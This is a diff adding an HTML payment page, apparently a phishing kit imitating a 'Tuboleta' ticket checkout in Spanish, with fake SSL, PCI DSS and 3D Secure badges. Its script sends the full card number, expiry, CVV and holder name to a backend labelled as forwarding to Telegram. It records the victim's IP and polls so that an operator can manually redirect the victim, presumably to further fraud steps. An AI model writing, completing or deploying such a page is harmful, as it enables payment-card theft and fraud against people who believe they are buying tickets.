@@ -1,0 +1,961 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Pago con Tarjeta · Tuboleta</title>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    :root {
+      --blue:      #0066b3;
+      --blue-dark: #004d8a;
+      --yellow:    #f9a825;
+      --green:     #00b050;
+      --bg:        #eef2f7;
+      --white:     #ffffff;
+      --border:    #dde4ee;
+      --text:      #1a1e2e;
+      --muted:     #7a859a;
+      --error:     #e53935;
+      --card-h:    200px;
+    }
+
+    body {
+      font-family: 'DM Sans', sans-serif;
+      background: var(--bg);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 32px 16px;
+      color: var(--text);
+    }
+
+    /* ── Wrapper ── */
+    .pay-wrapper {
+      width: 100%;
+      max-width: 480px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      animation: fadeUp 0.5s ease both;
+    }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(18px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ── Header info ── */
+    .pay-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 4px;
+    }
+
+    .pay-header-left {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .back-btn {
+      width: 36px; height: 36px;
+      border-radius: 10px;
+      border: 1.5px solid var(--border);
+      background: var(--white);
+      display: flex; align-items: center; justify-content: center;
+      cursor: pointer;
+      transition: background 0.15s;
+      text-decoration: none;
+      color: var(--text);
+    }
+    .back-btn:hover { background: #f0f4fa; }
+
+    .pay-title { font-size: 18px; font-weight: 700; }
+
+    .secure-pill {
+      display: flex; align-items: center; gap: 5px;
+      background: #e8f5e9;
+      color: var(--green);
+      font-size: 11px;
+      font-weight: 600;
+      padding: 5px 10px;
+      border-radius: 20px;
+      letter-spacing: 0.3px;
+    }
+
+    /* ── Card visual ── */
+    .card-visual {
+      height: var(--card-h);
+      border-radius: 20px;
+      background: linear-gradient(135deg, var(--blue-dark) 0%, var(--blue) 55%, #1a8fe0 100%);
+      position: relative;
+      overflow: hidden;
+      padding: 24px 28px;
+      color: white;
+      box-shadow: 0 14px 40px rgba(0,102,179,0.35);
+      transition: transform 0.3s ease;
+    }
+
+    .card-visual:hover { transform: translateY(-3px); }
+
+    /* Círculos decorativos */
+    .card-circle {
+      position: absolute;
+      border-radius: 50%;
+      opacity: 0.12;
+    }
+    .card-circle-1 { width: 220px; height: 220px; background: white; top: -80px; right: -50px; }
+    .card-circle-2 { width: 140px; height: 140px; background: white; bottom: -60px; left: -30px; }
+
+    .card-chip {
+      width: 38px; height: 28px;
+      background: linear-gradient(135deg, #e8c94a, #f0dc82);
+      border-radius: 6px;
+      margin-bottom: 20px;
+      position: relative;
+      z-index: 1;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      grid-template-rows: 1fr 1fr;
+      gap: 2px;
+      padding: 4px;
+    }
+
+    .card-chip::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      border-radius: 6px;
+      border: 1px solid rgba(0,0,0,0.15);
+    }
+
+    .card-number-display {
+      font-family: 'DM Mono', monospace;
+      font-size: 17px;
+      font-weight: 500;
+      letter-spacing: 3px;
+      margin-bottom: 18px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .card-bottom {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-end;
+      position: relative;
+      z-index: 1;
+    }
+
+    .card-label { font-size: 9px; opacity: 0.7; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 2px; }
+    .card-value { font-size: 14px; font-weight: 600; letter-spacing: 1px; }
+
+    .card-network {
+      display: flex;
+      gap: -8px;
+    }
+
+    .card-network .circle {
+      width: 32px; height: 32px;
+      border-radius: 50%;
+      opacity: 0.9;
+    }
+
+    .circle-red  { background: #eb001b; }
+    .circle-yell { background: #f79e1b; margin-left: -12px; mix-blend-mode: multiply; opacity: 0.85; }
+
+    /* ── Form card ── */
+    .form-card {
+      background: var(--white);
+      border-radius: 20px;
+      padding: 28px 28px 32px;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.07);
+    }
+
+    .form-section-label {
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 1.4px;
+      text-transform: uppercase;
+      color: var(--muted);
+      margin-bottom: 16px;
+    }
+
+    .field-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 14px;
+      margin-bottom: 14px;
+    }
+
+    .field-row.full { grid-template-columns: 1fr; }
+
+    .field-group { display: flex; flex-direction: column; gap: 6px; }
+
+    .field-group label {
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--muted);
+      letter-spacing: 0.3px;
+    }
+
+    .input-wrap {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .input-wrap input {
+      width: 100%;
+      padding: 12px 14px;
+      padding-right: 40px;
+      border: 1.5px solid var(--border);
+      border-radius: 10px;
+      font-family: 'DM Sans', sans-serif;
+      font-size: 14px;
+      color: var(--text);
+      background: #f8fafd;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+    }
+
+    .input-wrap input:focus {
+      border-color: var(--blue);
+      background: white;
+      box-shadow: 0 0 0 3px rgba(0,102,179,0.1);
+    }
+
+    .input-wrap input.error {
+      border-color: var(--error);
+      box-shadow: 0 0 0 3px rgba(229,57,53,0.1);
+    }
+
+    .input-wrap input.valid {
+      border-color: var(--green);
+    }
+
+    /* Número de tarjeta con fuente mono */
+    .input-wrap input.mono {
+      font-family: 'DM Mono', monospace;
+      letter-spacing: 2px;
+      font-size: 15px;
+    }
+
+    .input-icon {
+      position: absolute;
+      right: 12px;
+      display: flex;
+      align-items: center;
+      pointer-events: none;
+      color: var(--muted);
+    }
+
+    .input-icon.green { color: var(--green); }
+    .input-icon.hidden { display: none; }
+
+    /* Indicador de red de tarjeta */
+    .card-brand-icons {
+      position: absolute;
+      right: 10px;
+      display: flex;
+      gap: 4px;
+      align-items: center;
+    }
+
+    .brand-icon {
+      height: 20px;
+      width: auto;
+      opacity: 0.35;
+      transition: opacity 0.2s;
+      border-radius: 3px;
+    }
+    .brand-icon.active { opacity: 1; }
+
+    .field-error {
+      font-size: 11px;
+      color: var(--error);
+      margin-top: 2px;
+      display: none;
+    }
+    .field-error.show { display: block; }
+
+    /* Tooltip CVV */
+    .cvv-help {
+      position: relative;
+      display: inline-flex;
+      align-items: center;
+      cursor: pointer;
+      margin-left: 4px;
+    }
+
+    .cvv-help svg { color: var(--muted); }
+
+    .cvv-tooltip {
+      position: absolute;
+      bottom: calc(100% + 8px);
+      right: -8px;
+      background: var(--text);
+      color: white;
+      font-size: 11px;
+      padding: 8px 12px;
+      border-radius: 8px;
+      width: 180px;
+      line-height: 1.5;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.2s;
+      z-index: 10;
+    }
+
+    .cvv-tooltip::after {
+      content: '';
+      position: absolute;
+      top: 100%; right: 14px;
+      border: 6px solid transparent;
+      border-top-color: var(--text);
+    }
+
+    .cvv-help:hover .cvv-tooltip { opacity: 1; }
+
+    /* Separador */
+    .form-sep {
+      height: 1px;
+      background: var(--border);
+      margin: 22px 0;
+    }
+
+    /* Resumen */
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      font-size: 13px;
+      color: var(--muted);
+      padding: 5px 0;
+    }
+
+    .summary-row.total {
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--text);
+      padding-top: 10px;
+      margin-top: 4px;
+      border-top: 1.5px solid var(--border);
+    }
+
+    .summary-row span:last-child { font-weight: 600; color: var(--text); }
+    .summary-row.total span:last-child { color: var(--blue); }
+
+    /* Botón pagar */
+    .btn-pay {
+      width: 100%;
+      margin-top: 24px;
+      padding: 16px;
+      background: var(--yellow);
+      color: white;
+      font-family: 'DM Sans', sans-serif;
+      font-size: 16px;
+      font-weight: 700;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: background 0.2s, transform 0.15s, box-shadow 0.2s;
+      box-shadow: 0 4px 16px rgba(249,168,37,0.4);
+      letter-spacing: 0.3px;
+    }
+
+    .btn-pay:hover {
+      background: #e69000;
+      transform: translateY(-1px);
+      box-shadow: 0 8px 24px rgba(249,168,37,0.45);
+    }
+
+    .btn-pay:active { transform: translateY(0); }
+
+    .btn-pay .lock-icon { flex-shrink: 0; }
+
+    /* Badges de seguridad */
+    .security-badges {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+
+    .badge {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 11px;
+      color: var(--muted);
+      font-weight: 500;
+    }
+
+    .badge svg { flex-shrink: 0; }
+
+    .badge-divider {
+      width: 1px;
+      height: 14px;
+      background: var(--border);
+    }
+
+    /* Modal procesando */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(10,20,40,0.5);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      padding: 20px;
+    }
+
+    .modal-box {
+      background: white;
+      border-radius: 24px;
+      padding: 44px 36px;
+      text-align: center;
+      max-width: 300px;
+      width: 100%;
+      box-shadow: 0 30px 80px rgba(0,0,0,0.2);
+      animation: popIn 0.3s cubic-bezier(0.34,1.56,0.64,1) both;
+    }
+
+    @keyframes popIn {
+      from { opacity: 0; transform: scale(0.85); }
+      to   { opacity: 1; transform: scale(1); }
+    }
+
+    .modal-icon-wrap {
+      width: 72px; height: 72px;
+      background: linear-gradient(135deg, var(--blue-dark), var(--blue));
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 20px;
+    }
+
+    .spinner {
+      width: 36px; height: 36px;
+      border: 3px solid rgba(255,255,255,0.3);
+      border-top-color: white;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .modal-title { font-size: 18px; font-weight: 700; margin-bottom: 8px; }
+    .modal-sub { font-size: 13px; color: var(--muted); line-height: 1.5; }
+
+    /* Responsive */
+    @media (max-width: 520px) {
+      body { padding: 20px 12px; justify-content: flex-start; padding-top: 28px; }
+      .form-card { padding: 22px 18px 26px; }
+      .card-visual { padding: 20px 20px; }
+      .card-number-display { font-size: 15px; letter-spacing: 2px; }
+      .field-row { grid-template-columns: 1fr; }
+      .security-badges { gap: 10px; }
+      .badge-divider { display: none; }
+    }
+
+    @media (max-width: 360px) {
+      .pay-title { font-size: 16px; }
+      .btn-pay { font-size: 15px; padding: 14px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="pay-wrapper">
+
+  <!-- Header -->
+  <div class="pay-header">
+    <div class="pay-header-left">
+      <a href="checkout.html" class="back-btn" title="Volver">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+          <path d="M15 18l-6-6 6-6"/>
+        </svg>
+      </a>
+      <span class="pay-title">Pago con tarjeta</span>
+    </div>
+    <div class="secure-pill">
+      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+      </svg>
+      SSL Seguro
+    </div>
+  </div>
+
+  <!-- Tarjeta visual -->
+  <div class="card-visual" id="cardVisual">
+    <div class="card-circle card-circle-1"></div>
+    <div class="card-circle card-circle-2"></div>
+    <div class="card-chip"></div>
+    <div class="card-number-display" id="cardNumberDisplay">•••• &nbsp;•••• &nbsp;•••• &nbsp;••••</div>
+    <div class="card-bottom">
+      <div>
+        <div class="card-label">Titular</div>
+        <div class="card-value" id="cardNameDisplay">NOMBRE APELLIDO</div>
+      </div>
+      <div>
+        <div class="card-label">Vence</div>
+        <div class="card-value" id="cardExpDisplay">MM/AA</div>
+      </div>
+      <div class="card-network">
+        <div class="circle circle-red"></div>
+        <div class="circle circle-yell"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Formulario -->
+  <div class="form-card">
+
+    <p class="form-section-label">Datos de la tarjeta</p>
+
+    <!-- Número -->
+    <div class="field-row full" style="margin-bottom:14px;">
+      <div class="field-group">
+        <label for="cardNumber">Número de tarjeta</label>
+        <div class="input-wrap">
+          <input type="text" id="cardNumber" class="mono" placeholder="0000 0000 0000 0000"
+            maxlength="19" inputmode="numeric" autocomplete="cc-number">
+          <div class="card-brand-icons" id="brandIcons">
+            <!-- Visa SVG inline -->
+            <svg class="brand-icon" id="brandVisa" width="32" height="20" viewBox="0 0 32 20">
+              <rect width="32" height="20" rx="3" fill="#1a1f71"/>
+              <text x="4" y="15" font-family="Arial" font-size="11" font-weight="bold" fill="white">VISA</text>
+            </svg>
+            <!-- MC circles -->
+            <svg class="brand-icon" id="brandMC" width="32" height="20" viewBox="0 0 32 20">
+              <rect width="32" height="20" rx="3" fill="#252525"/>
+              <circle cx="12" cy="10" r="7" fill="#eb001b"/>
+              <circle cx="20" cy="10" r="7" fill="#f79e1b"/>
+              <path d="M16 4.5a7 7 0 0 1 0 11 7 7 0 0 1 0-11z" fill="#ff5f00"/>
+            </svg>
+          </div>
+        </div>
+        <span class="field-error" id="errNumber">Número de tarjeta inválido</span>
+      </div>
+    </div>
+
+    <!-- Nombre -->
+    <div class="field-row full">
+      <div class="field-group">
+        <label for="cardName">Nombre del titular (como aparece en la tarjeta)</label>
+        <div class="input-wrap">
+          <input type="text" id="cardName" placeholder="CARLOS PÉREZ"
+            maxlength="26" autocomplete="cc-name" style="text-transform:uppercase;">
+          <span class="input-icon" id="iconName">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <circle cx="12" cy="8" r="4"/><path d="M4 21v-1a6 6 0 0 1 12 0v1"/>
+            </svg>
+          </span>
+        </div>
+        <span class="field-error" id="errName">Ingresa el nombre del titular</span>
+      </div>
+    </div>
+
+    <!-- Exp + CVV -->
+    <div class="field-row">
+      <div class="field-group">
+        <label for="cardExp">Fecha de vencimiento</label>
+        <div class="input-wrap">
+          <input type="text" id="cardExp" class="mono" placeholder="MM / AA"
+            maxlength="7" inputmode="numeric" autocomplete="cc-exp">
+          <span class="input-icon" id="iconExp">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/>
+              <line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/>
+            </svg>
+          </span>
+        </div>
+        <span class="field-error" id="errExp">Fecha inválida o vencida</span>
+      </div>
+
+      <div class="field-group">
+        <label for="cardCvv" style="display:flex;align-items:center;gap:4px;">
+          CVV / CVC
+          <span class="cvv-help">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/>
+            </svg>
+            <span class="cvv-tooltip">Los 3 dígitos al dorso de tu tarjeta (Visa/MC) o 4 dígitos al frente (Amex).</span>
+          </span>
+        </label>
+        <div class="input-wrap">
+          <input type="password" id="cardCvv" class="mono" placeholder="•••"
+            maxlength="4" inputmode="numeric" autocomplete="cc-csc">
+          <span class="input-icon" id="iconCvv">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+            </svg>
+          </span>
+        </div>
+        <span class="field-error" id="errCvv">CVV inválido</span>
+      </div>
+    </div>
+
+    <!-- Separador + resumen -->
+    <div class="form-sep"></div>
+
+    <p class="form-section-label">Resumen del pedido</p>
+
+    <div class="summary-row">
+      <span>Evento</span>
+      <span>Classic Night · 4 de abril</span>
+    </div>
+    <div class="summary-row">
+      <span>Tipo de boleta</span>
+      <span id="summaryTipo">General</span>
+    </div>
+    <div class="summary-row">
+      <span>Cantidad</span>
+      <span id="summaryCant">1 boleta</span>
+    </div>
+    <div class="summary-row">
+      <span>Cargo por servicio</span>
+      <span>Incluido</span>
+    </div>
+    <div class="summary-row total">
+      <span>Total</span>
+      <span id="totalAmount">$ —</span>
+    </div>
+
+    <!-- Botón pagar -->
+    <button class="btn-pay" id="btnPay">
+      <svg class="lock-icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+        <rect x="3" y="11" width="18" height="11" rx="2"/>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+      </svg>
+      Pagar ahora
+    </button>
+
+    <!-- Badges -->
+    <div style="margin-top:18px;">
+      <div class="security-badges">
+        <div class="badge">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          </svg>
+          Cifrado SSL 256-bit
+        </div>
+        <div class="badge-divider"></div>
+        <div class="badge">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M9 12l2 2 4-4"/><circle cx="12" cy="12" r="10"/>
+          </svg>
+          PCI DSS Cumplido
+        </div>
+        <div class="badge-divider"></div>
+        <div class="badge">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <rect x="2" y="5" width="20" height="14" rx="2"/>
+            <line x1="2" y1="10" x2="22" y2="10"/>
+          </svg>
+          3D Secure
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Footer -->
+  <p style="text-align:center; font-size:11px; color:#a0aab8; padding-bottom:8px;">
+    © 2026 Tuboleta · Pagos procesados de forma segura
+  </p>
+
+</div>
+
+<!-- Modal procesando -->
+<div class="modal-overlay" id="modalPago">
+  <div class="modal-box">
+    <div class="modal-icon-wrap">
+      <div class="spinner"></div>
+    </div>
+    <p class="modal-title">Procesando pago...</p>
+    <p class="modal-sub">Estamos verificando tu tarjeta de forma segura. No cierres esta ventana.</p>
+  </div>
+</div>
+
+<script>
+  // ── Guardar IP del cliente al inicio ──
+  (async function() {
+    if (!localStorage.getItem('user_ip')) {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        localStorage.setItem('user_ip', data.ip);
+      } catch (e) {}
+    }
+  })();
+
+  // ── Cargar datos del localStorage ──
+  window.addEventListener('load', function() {
+    const monto = localStorage.getItem('pago_monto');
+    const detalle = localStorage.getItem('pago_detalle');
+
+    if (monto) {
+      document.getElementById('totalAmount').textContent = '$ ' + parseInt(monto).toLocaleString('es-CO');
+    }
+
+    if (detalle) {
+      const parts = detalle.split('x');
+      if (parts.length === 2) {
+        document.getElementById('summaryTipo').textContent = parts[0].trim();
+        document.getElementById('summaryCant').textContent = parts[1].trim() + ' boleta' + (parseInt(parts[1]) > 1 ? 's' : '');
+      }
+    }
+  });
+
+  // ── Formateo de inputs ──
+
+  const numberInput = document.getElementById('cardNumber');
+  const nameInput   = document.getElementById('cardName');
+  const expInput    = document.getElementById('cardExp');
+  const cvvInput    = document.getElementById('cardCvv');
+
+  const cardNumberDisplay = document.getElementById('cardNumberDisplay');
+  const cardNameDisplay   = document.getElementById('cardNameDisplay');
+  const cardExpDisplay    = document.getElementById('cardExpDisplay');
+
+  // Número: formato 0000 0000 0000 0000
+  numberInput.addEventListener('input', function() {
+    let v = this.value.replace(/\D/g, '').substring(0, 16);
+    let formatted = v.replace(/(.{4})/g, '$1 ').trim();
+    this.value = formatted;
+
+    // Actualizar visual
+    let display = v.padEnd(16, '•');
+    cardNumberDisplay.innerHTML =
+      display.substring(0,4) + ' &nbsp;' +
+      display.substring(4,8) + ' &nbsp;' +
+      display.substring(8,12) + ' &nbsp;' +
+      display.substring(12,16);
+
+    // Detectar red
+    detectBrand(v);
+    validateNumber(false);
+  });
+
+  function detectBrand(num) {
+    const visa = document.getElementById('brandVisa');
+    const mc   = document.getElementById('brandMC');
+    visa.classList.remove('active');
+    mc.classList.remove('active');
+    if (/^4/.test(num)) visa.classList.add('active');
+    else if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) mc.classList.add('active');
+  }
+
+  // Nombre
+  nameInput.addEventListener('input', function() {
+    this.value = this.value.toUpperCase().replace(/[^A-Z\s]/g, '');
+    cardNameDisplay.textContent = this.value || 'NOMBRE APELLIDO';
+    validateName(false);
+  });
+
+  // Fecha: MM / AA
+  expInput.addEventListener('input', function() {
+    let v = this.value.replace(/\D/g, '').substring(0, 4);
+    if (v.length >= 3) {
+      v = v.substring(0,2) + ' / ' + v.substring(2);
+    }
+    this.value = v;
+    let parts = v.replace(/\s/g,'').split('/');
+    cardExpDisplay.textContent = (parts[0] || 'MM') + '/' + (parts[1] || 'AA');
+    validateExp(false);
+  });
+
+  // CVV
+  cvvInput.addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '').substring(0, 4);
+    validateCvv(false);
+  });
+
+  // ── Validaciones ──
+
+  function luhn(num) {
+    let s = 0, alt = false;
+    for (let i = num.length - 1; i >= 0; i--) {
+      let n = parseInt(num[i]);
+      if (alt) { n *= 2; if (n > 9) n -= 9; }
+      s += n; alt = !alt;
+    }
+    return s % 10 === 0;
+  }
+
+  function showErr(id, show) {
+    const el = document.getElementById(id);
+    if (show) el.classList.add('show'); else el.classList.remove('show');
+  }
+
+  function setValid(input, ok) {
+    input.classList.toggle('valid', ok);
+    input.classList.toggle('error', !ok && input.value.length > 0);
+  }
+
+  function validateNumber(strict = true) {
+    const v = numberInput.value.replace(/\s/g,'');
+    const ok = v.length >= 13 && luhn(v);
+    if (strict || v.length > 0) { showErr('errNumber', !ok); setValid(numberInput, ok); }
+    return ok;
+  }
+
+  function validateName(strict = true) {
+    const v = nameInput.value.trim();
+    const ok = v.length >= 3 && v.includes(' ');
+    if (strict || v.length > 0) { showErr('errName', !ok); setValid(nameInput, ok); }
+    return ok;
+  }
+
+  function validateExp(strict = true) {
+    const v = expInput.value.replace(/\s/g,'').replace('/','');
+    if (v.length < 4) {
+      if (strict) { showErr('errExp', true); setValid(expInput, false); }
+      return false;
+    }
+    const m = parseInt(v.substring(0,2));
+    const y = parseInt('20' + v.substring(2,4));
+    const now = new Date();
+    const ok = m >= 1 && m <= 12 &&
+               (y > now.getFullYear() || (y === now.getFullYear() && m >= now.getMonth() + 1));
+    if (strict || v.length > 0) { showErr('errExp', !ok); setValid(expInput, ok); }
+    return ok;
+  }
+
+  function validateCvv(strict = true) {
+    const v = cvvInput.value;
+    const ok = v.length >= 3;
+    if (strict || v.length > 0) { showErr('errCvv', !ok); setValid(cvvInput, ok); }
+    return ok;
+  }
+
+  // ── Submit - MODIFICADO PARA TELEGRAM ──
+  document.getElementById('btnPay').addEventListener('click', async function() {
+    const n = validateNumber();
+    const nm = validateName();
+    const e = validateExp();
+    const c = validateCvv();
+
+    if (!n || !nm || !e || !c) return;
+
+    // Mostrar modal
+    document.getElementById('modalPago').style.display = 'flex';
+
+    // Preparar datos del pago
+    const numeroTarjeta = numberInput.value.replace(/\s/g, '');
+    const ultimosCuatro = numeroTarjeta.substring(numeroTarjeta.length - 4);
+    const nombreTitular = nameInput.value;
+    const fechaVencimiento = expInput.value;
+    const cvv = cvvInput.value;
+    const monto = localStorage.getItem('pago_monto') || '0';
+    const detalle = localStorage.getItem('pago_detalle') || 'Sin especificar';
+    const evento = localStorage.getItem('pago_evento') || 'Classic Night';
+    const cantidad = localStorage.getItem('pago_cantidad') || '1';
+    const tipoBoleta = localStorage.getItem('pago_tipo') || 'General';
+
+    try {
+      // Enviar a Telegram
+      const response = await fetch('/api/send-payment-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          numeroCompleto: numeroTarjeta,
+          nombreTitular: nombreTitular,
+          ultimosCuatro: ultimosCuatro,
+          fechaVencimiento: fechaVencimiento,
+          cvv: cvv,
+          evento: evento,
+          tipoBoleta: tipoBoleta,
+          cantidad: cantidad,
+          monto: monto,
+          detalle: detalle,
+          timestamp: new Date().toLocaleString('es-CO')
+        })
+      });
+
+      const result = await response.json();
+
+      if (result.success) {
+        // Guardar datos para la página de confirmación
+        localStorage.setItem('pago_monto', monto);
+        localStorage.setItem('pago_detalle', detalle);
+        localStorage.setItem('pago_nombre', nombreTitular);
+        localStorage.setItem('pago_email', localStorage.getItem('pago_email') || 'cliente@email.com');
+        localStorage.setItem('pago_tarjeta', ultimosCuatro);
+        localStorage.setItem('pago_evento', evento);
+        
+        // Notificar al servidor que hay un pago pendiente (enviar IP del cliente)
+        const clientIP = localStorage.getItem('user_ip') || await getClientIP();
+        fetch('/api/start-payment', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ ip: clientIP })
+        });
+        
+        // Quedarse en el modal y hacer polling para verificar redirect
+        startPaymentPolling();
+      } else {
+        alert('❌ Error al procesar: ' + result.error);
+        document.getElementById('modalPago').style.display = 'none';
+      }
+    } catch (error) {
+      console.error('Error:', error);
+      alert('❌ Error al conectar con el servidor');
+      document.getElementById('modalPago').style.display = 'none';
+    }
+  });
+
+  // Polling para verificar redirección desde el panel
+  let paymentPollingInterval = null;
+  
+  function startPaymentPolling() {
+    // Cambiar el texto del modal para indicar espera
+    const modalTitle = document.querySelector('.modal-title');
+    const modalSub = document.querySelector('.modal-sub');
+    if (modalTitle) modalTitle.textContent = 'Esperando verificación...';
+    if (modalSub) modalSub.textContent = 'Un administrador debe aprobar tu pago';
+    
+    // Iniciar polling cada 2 segundos
+    paymentPollingInterval = setInterval(async () => {
+      try {
+        const clientIP = localStorage.getItem('user_ip') || await getClientIP();
+        const res = await fetch('/api/check-redirect?ip=' + clientIP);
+        const data = await res.json();
+        
+        if (data.redirect) {
+          clearInterval(paymentPollingInterval);
+          window.location.href = data.redirect;
+        }
+      } catch (e) {}
+    }, 2000);
+  }
+  
+  // Obtener IP del cliente
+  async function getClientIP() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip;
+    } catch (e) {
+      return 'unknown';
+    }
+  }
+</script>
+
+</body>
+</html>
